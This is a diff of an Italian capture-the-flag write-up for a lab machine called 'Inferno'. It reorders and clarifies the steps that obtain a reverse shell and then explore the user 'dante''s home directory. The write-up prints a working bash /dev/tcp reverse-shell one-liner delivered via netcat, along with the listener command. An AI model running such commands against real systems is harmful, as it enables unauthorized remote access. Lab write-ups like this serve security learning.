@@ -55,11 +55,11 @@ Successivamente, ho proceduto con l'esecuzione dei comandi necessari per eseguir
 
 Nel secondo terminale ho eseguito:
 
-- `echo 'bash -c "bash -i >/dev/tcp/10.0.2.11/4445 0>&1 2>&1"' | nc -lnvp 4444`: invia una stringa di comando a un terminale remoto tramite netcat, configurando una shell inversa che si connette al server IP con l'indirizzo IP 10.0.2.6 sulla porta 4445.
+- `nc -lnvp 4445`: avvia netcat in modalità "ascolto" sulla porta TCP 4445. Ciò consente a netcat di accettare connessioni in arrivo su quella porta e di gestire i dati scambiati attraverso la connessione.
 
 Nel terzo terminale, ho eseguito:
 
-- `nc -lnvp 4445`: avvia netcat in modalità "ascolto" sulla porta TCP 4445. Ciò consente a netcat di accettare connessioni in arrivo su quella porta e di gestire i dati scambiati attraverso la connessione.
+- `echo 'bash -c "bash -i >/dev/tcp/10.0.2.11/4445 0>&1 2>&1"' | nc -lnvp 4444`: invia una stringa di comando a un terminale remoto tramite netcat, configurando una shell inversa che si connette al server IP con l'indirizzo IP 10.0.2.6 sulla porta 4445.
 
 Risultato: nel terzo terminale dopo aver confermato l’esecuzione del comando con il tasto yes ho ottenuto la reverse shell.
 www-data@Inferno:/var/www/html/inferno/components/filemanager$
@@ -70,7 +70,7 @@ Questo indica che ho ottenuto accesso al sistema remoto tramite la shell inversa
 
 A questo punto, ho eseguito una serie di comandi per esplorare la struttura del file system, navigare tra le directory e visualizzare il contenuto dei file. Innanzitutto, ho utilizzato il comando `ls` per visualizzare i file e le directory presenti nella directory corrente. Successivamente, ho cambiato directory spostandomi nella directory principale degli utenti, `/home`, con il comando `cd /home`. All'interno di questa directory, ho individuato la directory dell'utente "dante" e mi sono spostato al suo interno utilizzando il comando `cd dante`.
 
-Qui, ho eseguito nuovamente il comando `ls` per esplorare il contenuto della directory "dante" e qui ho trovato il documento `local.txt` ma provando ad eseguirlo ho ottenuto come risposta “Permission denied”. Successivamente ho utilizzato il comando `ls -lah` per ottenere un elenco dettagliato, inclusi i file e le directory nascoste nella directory dante. Dopo aver esplorato questa directory, mi sono spostata nella directory "Downloads" utilizzando il comando `cd /home/dante/Downloads/`, dove ho eseguito ulteriori esplorazioni utilizzando ancora una volta il comando `ls -lah`.
+Qui, ho eseguito nuovamente il comando `ls` per esplorare il contenuto della directory "dante" e qui ho trovato il documento `local.txt` ma provando ad eseguirlo ho ottenuto come risposta “Permission denied” in quanto non ho i privilegi necessari. Successivamente ho utilizzato il comando `ls -lah` per ottenere un elenco dettagliato, inclusi i file e le directory nascoste nella directory dante. Dopo aver esplorato questa directory, mi sono spostata nella directory "Downloads" utilizzando il comando `cd /home/dante/Downloads/`, dove ho eseguito ulteriori esplorazioni utilizzando ancora una volta il comando `ls -lah`.
 
 Tra i file presenti, ho notato un file chiamato `download.dat`. Per visualizzare il contenuto di questo documento, ho utilizzato il comando `cat download.dat`, che ha restituito un risultato codificato in base64. Per decodificare il contenuto e visualizzarlo in chiaro, ho utilizzato il tool "Cyberchef”, uno strumento di decodifica avanzato utilizzato per convertire e visualizzare contenuti codificati in chiaro in modo rapido ed efficiente.
 
